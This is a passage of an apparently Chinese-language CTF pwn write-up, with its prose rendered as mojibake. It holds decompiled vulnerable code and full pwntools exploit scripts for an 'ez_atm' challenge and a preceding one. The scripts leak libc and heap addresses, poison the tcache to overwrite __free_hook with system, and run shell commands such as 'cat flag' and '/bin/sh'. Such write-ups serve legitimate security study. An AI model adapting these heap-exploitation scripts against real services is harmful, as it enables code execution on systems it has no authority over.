r.recvuntil(<span class="string">b&#x27;input your test cmd:&#x27;</span>)</span><br><span class="line">    payload = <span class="string">&#x27;show#&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(idx))</span><br><span class="line">    payload = <span class="built_in">bytes</span>(payload, encoding=<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">    r.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;input your test cmd:&#x27;</span>)</span><br><span class="line">    payload = <span class="string">&#x27;delete#&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(idx))</span><br><span class="line">    payload = <span class="built_in">bytes</span>(payload, encoding=<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">    r.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">idx, offset, length</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;input your test cmd:&#x27;</span>)</span><br><span class="line">    payload = <span class="string">&#x27;encrypt#&#123;&#125;#&#123;&#125;#&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(idx), <span class="built_in">str</span>(offset), <span class="built_in">str</span>(length))</span><br><span class="line">    payload = <span class="built_in">bytes</span>(payload, encoding=<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">    r.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">11</span>):</span><br><span class="line">    create(i, <span class="built_in">str</span>(i))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    delete(<span class="number">10</span>-i)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">show(<span class="number">3</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;1.1.1 1:1:4\n&#x27;</span>)</span><br><span class="line">heap_base = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x13a30</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;heap_base:&quot;</span>, <span class="built_in">hex</span>(heap_base))</span><br><span class="line">update(<span class="number">3</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;1.1.1 1:1:4\n&#x27;</span>)</span><br><span class="line">libc_base = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x1ecbe0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libc_base:&quot;</span>, <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">free_hook = libc_base+<span class="number">0x1eee48</span></span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;input your test cmd:&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;update#0#&#x27;</span> + flat(free_hook-<span class="number">4</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">encrypt(<span class="number">0</span>, <span class="number">4</span>, <span class="number">6</span>)</span><br><span class="line">update(<span class="number">0</span>, <span class="string">&#x27;A&#x27;</span>*(<span class="number">0x2c0</span>-<span class="number">0x16</span>))</span><br><span class="line">create(<span class="number">40</span>, <span class="string">&#x27;/bin/sh;&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;input your test cmd:&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;add#1#1#1#1#1#41#&#x27;</span>+flat(system_addr)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(r)</span></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>è¿™é“é¢˜æˆ‘åœ¨ä¸‹é¢è¿™ä¸ªä½ç½®è¿™é‡Œç ´é˜²äº†ï¼Œä¸€ç›´æ— æ³•<code>double free</code>æˆ‘è¿˜ä»¥ä¸ºæ˜¯glibcä¸­æ£€æŸ¥äº†åˆä¸æŠ¥é”™ï¼Œå»ç¿»äº†æºç å‘ç°ä¼šæœ‰æŠ¥é”™ï¼Œè¿™æ‰çœ‹äº†é¢˜ç›®è¿™é‡Œå±…ç„¶æœ‰è¿™æ ·ä¸€ä¸ªéªŒè¯å±äºæ˜¯æœ‰ç‚¹å„¿æ¶å¿ƒäººäº†ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">_BOOL8 __fastcall <span class="title">sub_43CC</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">memcmp</span>(*(<span class="keyword">const</span> <span class="keyword">void</span> **)(a1 + <span class="number">0x10</span>), <span class="string">&quot;    &quot;</span>, <span class="number">4uLL</span>) == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">sub_4194</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( *(_QWORD *)(a1 + <span class="number">0x10</span>) &amp;&amp; (<span class="keyword">unsigned</span> __int8)sub_43CC(a1) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *(_QWORD *)(a1 + <span class="number">0x10</span>) )</span><br><span class="line">      <span class="keyword">operator</span> <span class="keyword">delete</span>[](*(<span class="keyword">void</span> **)(a1 + <span class="number">0x10</span>));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ez-atm"><a href="#ez-atm" class="headerlink" title="ez_atm"></a>ez_atm</h2><h3 id="åˆ©ç”¨åˆ†æ-1"><a href="#åˆ©ç”¨åˆ†æ-1" class="headerlink" title="åˆ©ç”¨åˆ†æ"></a>åˆ©ç”¨åˆ†æ</h3><p>é¢˜ç›®éš¾åº¦ä¾æ—§ä¸æ˜¯å¾ˆå¤§ï¼Œä½†æ˜¯æˆ‘æ²¡æƒ³æ˜ç™½çš„æ˜¯ï¼Œä¸€å¼€å§‹æˆ‘å¯ä»¥gdbå»è°ƒè¯•æœåŠ¡ç«¯ç¨‹åºï¼Œä½†æ˜¯åé¢å´ä¸€ç›´å¡åœ¨acceptäº†ï¼Œæœ‰å¤§ä½¬çŸ¥é“çš„è¯å¯ä»¥ç•™è¨€å‘Šè¯‰æˆ‘ä¸€ä¸‹æ€ä¹ˆå›äº‹ã€‚ä¹Ÿæ­£æ˜¯å› ä¸ºè¿™é“é¢˜ç›®æ¯”è¾ƒç®€å•æ‰å¯ä»¥åœ¨ä¸è°ƒè¯•çš„æƒ…å†µä¸‹ç›´æ¥æ‰“ã€‚</p><p>è¿™é“é¢˜é€†å‘åˆ†æè¿‡ç¨‹ä¹Ÿä¸ç®—å¾ˆéš¾ï¼Œå­˜åœ¨ä¸‰å¤„æ¼æ´ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">stat_query</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  reply_message(<span class="number">1</span>, a1);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªå‡½æ•°ä¸­è¿”å›çš„ä¾æ—§æ˜¯<code>0x84</code>ä¸ªå­—èŠ‚ï¼Œæ‰€ä»¥å°±å¯ä»¥è¯»å–åˆ°è¿”å›åœ°å€ä¹Ÿå°±æ˜¯libcä¸Šçš„åœ°å€äº†ï¼Œä»è€Œæ‹¿åˆ°libcåœ°å€ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">query</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  reply_message(<span class="number">1</span>, user_list[user_id]);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">2LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¬¬äºŒå¤„è·Ÿç¬¬ä¸€å¤„ç±»ä¼¼ï¼Œä¸åŒçš„æ˜¯è¿™é‡Œæ˜¯è¶Šç•Œè¯»å–å †ä¸Šçš„å†…å®¹ï¼Œé‚£ä¹ˆå¯ä»¥æ³„æ¼å‡ºå †åœ°å€ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">cancellation</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">5</span>; i &gt; <span class="number">0</span>; --i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( check_passwrod(user_id, &amp;password) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">free</span>((<span class="keyword">void</span> *)user_list[user_id]);</span><br><span class="line">      user_id = <span class="number">-1</span>;</span><br><span class="line">      reply_message(<span class="number">1</span>, (__int64)<span class="string">&quot;The target account has been cancelled.&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( i != <span class="number">1</span> )</span><br><span class="line">      reply_message(<span class="number">2</span>, (__int64)<span class="string">&quot;password error.Try again.&quot;</span>);</span><br><span class="line">    get_message();</span><br><span class="line">  &#125;</span><br><span class="line">  reply_message(</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    (__int64)<span class="string">&quot;The password has been entered incorrectly for more than 5 times, and your account has been frozen.&quot;</span>);</span><br><span class="line">  *(_DWORD *)(user_list[user_id] + <span class="number">0x2C</span>LL) = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸‰å¤„åˆ™æ˜¯è¿™é‡Œåœ¨freeä¹‹åæ²¡æœ‰æ¸…ç©ºæŒ‡é’ˆå¼•èµ·çš„UAFã€‚</p><p>æ‰€ä»¥åˆ©ç”¨æ€è·¯å°±æ˜¯å…ˆæ³„æ¼libcåœ°å€ï¼Œå†æ³„æ¼heapåœ°å€ï¼Œæœ€ååˆ©ç”¨UAFç¯¡æ”¹<code>tcache</code>ä¸­chunkçš„fdåˆ°<code>__free_hook</code>å³å¯ã€‚</p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> cdll</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">r = remote(<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">3339</span>)</span><br><span class="line"><span class="comment"># r = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_random</span>(<span class="params">random</span>):</span></span><br><span class="line">    <span class="keyword">if</span> random &lt;= <span class="number">9</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0x30</span>+random</span><br><span class="line">    <span class="keyword">if</span> random == <span class="number">10</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0x61</span></span><br><span class="line">    <span class="keyword">if</span> random == <span class="number">11</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0x62</span></span><br><span class="line">    <span class="keyword">if</span> random == <span class="number">12</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0x63</span></span><br><span class="line">    <span class="keyword">if</span> random == <span class="number">13</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0x64</span></span><br><span class="line">    <span class="keyword">if</span> random == <span class="number">14</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0x65</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0x30</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">seed = u32(r.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(seed))</span><br><span class="line">objdll = cdll.LoadLibrary(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">objdll.srand(seed)</span><br><span class="line">uuid = <span class="string">&#x27;yxyxyx-xyyx-4xyx4-xyyx-xyyyyxy&#x27;</span></span><br><span class="line">uuid = <span class="built_in">list</span>(uuid)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x1d</span> + <span class="number">1</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">ord</span>(uuid[i]) != <span class="number">52</span> <span class="keyword">and</span> <span class="built_in">ord</span>(uuid[i]) != <span class="number">45</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">ord</span>(uuid[i]) == <span class="number">0x78</span>:</span><br><span class="line">            random_num = objdll.rand() % <span class="number">15</span></span><br><span class="line">            uuid[i] = <span class="built_in">chr</span>(get_random(random_num))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            random_num = objdll.rand() % <span class="number">15</span></span><br><span class="line">            uuid[i] = <span class="built_in">chr</span>(get_random(random_num &amp; <span class="number">3</span> | <span class="number">8</span>))</span><br><span class="line">uuid = <span class="string">&#x27;&#x27;</span>.join(uuid)</span><br><span class="line"><span class="built_in">print</span>(uuid)</span><br><span class="line">r.send(uuid)</span><br><span class="line">r.recv(<span class="number">0x84</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">query</span>():</span></span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;query&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new_account</span>(<span class="params">account, password, money</span>):</span></span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    payload += <span class="string">b&#x27;new_account&#x27;</span>.ljust(<span class="number">0x10</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    payload += password.ljust(<span class="number">0x8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    payload += account.ljust(<span class="number">0x20</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    payload += <span class="built_in">bytes</span>(<span class="built_in">str</span>(money), encoding=<span class="string">&#x27;utf8&#x27;</span>).ljust(<span class="number">0x4</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    r.sendline(payload)</span><br><span class="line">    r.recv(<span class="number">0x84</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cancellation</span>(<span class="params">password</span>):</span></span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    payload += <span class="string">b&#x27;cancellation&#x27;</span>.ljust(<span class="number">0x10</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    payload += password.ljust(<span class="number">0x8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    r.sendline(payload)</span><br><span class="line">    r.recv(<span class="number">0x84</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span>(<span class="params">account, password</span>):</span></span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    payload += <span class="string">b&#x27;login&#x27;</span>.ljust(<span class="number">0x10</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    payload += password.ljust(<span class="number">0x8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    payload += account.ljust(<span class="number">0x20</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    r.sendline(payload)</span><br><span class="line">    r.recv(<span class="number">0x84</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">update_pwd</span>(<span class="params">old_password, new_password</span>):</span></span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    payload = <span class="string">b&#x27;update_pwd&#x27;</span>.ljust(<span class="number">0x10</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    payload += new_password.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    r.sendline(payload)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;please input your pasword.&#x27;</span>)</span><br><span class="line">    r.recv(<span class="number">0x84</span> - <span class="built_in">len</span>(<span class="string">&#x27;please input your pasword.&#x27;</span>))</span><br><span class="line">    payload = <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x10</span></span><br><span class="line">    payload += old_password.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    r.sendline(payload)</span><br><span class="line">    r.recv(<span class="number">0x84</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">new_account(<span class="string">b&#x27;dzhsb&#x27;</span>, <span class="string">b&#x27;wow&#x27;</span>, <span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;exit_account&#x27;</span>)</span><br><span class="line"></span><br><span class="line">new_account(<span class="string">b&#x27;dzz&#x27;</span>, <span class="string">b&#x27;zzz&#x27;</span>, <span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;exit_account&#x27;</span>)</span><br><span class="line"></span><br><span class="line">new_account(<span class="string">b&#x27;a&#x27;</span>, <span class="string">b&#x27;a&#x27;</span>, <span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;stat_query&#x27;</span>)</span><br><span class="line">r.recv(<span class="number">0x4</span>+<span class="number">0x18</span>)</span><br><span class="line">libc_base = u64(r.recv(<span class="number">8</span>)) - <span class="number">0x21c87</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">r.recv(<span class="number">0x84</span> - <span class="number">0x24</span>)</span><br><span class="line"></span><br><span class="line">cancellation(<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">login(<span class="string">b&#x27;dzz&#x27;</span>, <span class="string">b&#x27;zzz&#x27;</span>)</span><br><span class="line">cancellation(<span class="string">b&#x27;zzz&#x27;</span>)</span><br><span class="line">login(<span class="string">b&#x27;dzhsb&#x27;</span>, <span class="string">b&#x27;wow&#x27;</span>)</span><br><span class="line">query()</span><br><span class="line">r.recv(<span class="number">0x40</span> + <span class="number">4</span>)</span><br><span class="line">heap_addr = u64(r.recv(<span class="number">8</span>))</span><br><span class="line">tcache_addr = u64(r.recv(<span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(heap_addr))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(tcache_addr))</span><br><span class="line"></span><br><span class="line">free_hook = libc_base + <span class="number">0x3ed8e8</span></span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;exit_account&#x27;</span>)</span><br><span class="line"></span><br><span class="line">login(flat(tcache_addr), flat(heap_addr))</span><br><span class="line">update_pwd(flat(heap_addr), flat(free_hook))</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;exit_account&#x27;</span>)</span><br><span class="line"></span><br><span class="line">new_account(<span class="string">b&#x27;&gt;&amp;4&#x27;</span>, <span class="string">b&#x27;cat flag&#x27;</span>, <span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;exit_account&#x27;</span>)</span><br><span class="line">new_account(<span class="string">b&#x27;196082&#x27;</span>, flat(system_addr), <span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;exit_account&#x27;</span>)</span><br><span class="line">login(<span class="string">b&#x27;&gt;&amp;4&#x27;</span>, <span class="string">b&#x27;cat flag&#x27;</span>)</span><br><span class="line">cancellation(<span class="string">b&#x27;cat flag&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>å› ä¸ºè¿™æ˜¯csæ¶æ„çš„ç¼˜æ•…ï¼Œæ²¡æœ‰ç›´æ¥ä¸ç¨‹åºè¿›è¡Œäº¤äº’ï¼Œæ‰€ä»¥æ— æ³•ä½¿ç”¨<code>system(&quot;/bin/sh&quot;);</code>ã€‚è€ƒè™‘ä½¿ç”¨åå¼¹shellä½†æ˜¯éœ€è¦é•¿åº¦è¿‡é•¿äº†ï¼Œæœ€ååªèƒ½ç”¨è¿™ç§é‡å®šå‘çš„æ–¹æ³•ä¼ é€’flagã€‚</p><h2 id="money"><a href="#money" class="headerlink" title="_money"></a>_money</h2><h3 id="åˆ©ç”¨åˆ†æ-2"><a href="#åˆ©ç”¨åˆ†æ-2" class="headerlink" title="åˆ©ç”¨åˆ†æ"></a>åˆ©ç”¨åˆ†æ</h3><p>è¿™é“é¢˜ç›®çš„é€†å‘éƒ¨åˆ†å’Œä¸Šé¢é¢˜ç›®å¾ˆç±»ä¼¼ï¼Œç»†å¿ƒçš„è¯å¯ä»¥å¾ˆå¿«å‘ç°ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">loan</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __m128i *v0; <span class="comment">// rax</span></span><br><span class="line">  __int64 chunk; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// ecx</span></span><br><span class="line">  _DWORD *v3; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( loan_idx &gt; <span class="number">10</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    my_puts(<span class="string">&quot;The loan has reached the upper limit of the system.&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">2LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span 